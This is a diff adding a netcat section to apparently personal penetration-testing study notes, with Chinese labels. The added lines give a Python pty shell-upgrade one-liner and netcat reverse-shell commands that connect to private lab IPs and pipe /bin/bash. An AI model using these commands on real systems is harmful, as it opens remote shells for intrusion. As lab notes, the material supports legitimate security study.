@@ -133,6 +133,20 @@ sc start wsearch
 
 ---
 
+## Tools
+
+### nc
+
+```shell
+nc 升级shell
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+nc 反弹shell
+nc 172.16.8.1 1234 -e /bin/bash
+不支持-e参数
+nc 172.16.8.1 1234 | /bin/bash | nc 72.16.8.1 2345
+```
+
 ## Information Gathering
 
 <https://www.megacorpone.com/>
